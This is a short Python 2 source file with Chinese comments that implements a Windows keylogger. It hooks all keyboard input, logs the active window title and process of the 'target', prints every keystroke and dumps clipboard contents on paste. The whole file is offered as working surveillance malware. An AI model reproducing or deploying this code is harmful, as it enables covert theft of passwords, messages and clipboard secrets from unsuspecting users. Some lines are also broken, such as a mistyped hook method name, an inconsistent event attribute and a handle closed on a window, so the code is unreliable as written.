# -*- coding: utf-8 -*-
# @Time    : 2017/10/24 下午6:46
# @Author  : 逍遥哥哥
# @Email   : hellocatmao@gmail.com
# @File    : Keyboard_Recoard.py
# @Software: PyCharm

'''


Windows下键盘记录


'''

from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32  = windll.user32
kernel32    = windll.kernel32
psapi   = windll.psapi
current_window  = None

def Get_Current_Process():

    '''

    获取当前活动的窗口及对应的进程ID。

    :return:
    '''

    #获得前台窗口的句柄
    hwnd = user32.GetForegroundWindow()

    #获得进程ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    #保存当前的进程ID
    process_id = "%d" % pid.value

    #申请内存
    executable = create_string_buffer("\x00" * 512 )

    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

    #读取窗口标题
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)

    #输出进程相关的信息
    print("[PID: %s - %s - %s]" %(process_id, executable.value, window_title.value))

    #关闭句柄
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)



def KeyStorke(event):

    global current_window

    #检查目标是否切换了窗口
    if event.WindowName != current_window:
        current_window = event.WindowName
        Get_Current_Process()

    #检测按键是否为常规按键(非组合键等)
    if event.Ascii > 32 and event.Ascii < 127:
        print(chr(event.Ascii))
    else:
        #如果是【ctrl+v】，则获取剪切板的内容
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            print("[PASTE] - %s" % (pasted_value))

        else:

            print("[%s]" % event.key)

    return True





def Main():
    # 创建和注册钩子函数
    k1  = pyHook.HookManager()

    #将自定义的回调函数KeyStorke与KeyDown事件进行绑定
    k1.KeyDown = KeyStorke



    #注册键盘记录的钩子，然后永久执行
    k1.Hookkeyboard()
    pythoncom.PumpMessages()

if __name__ == '__main__':
    Main()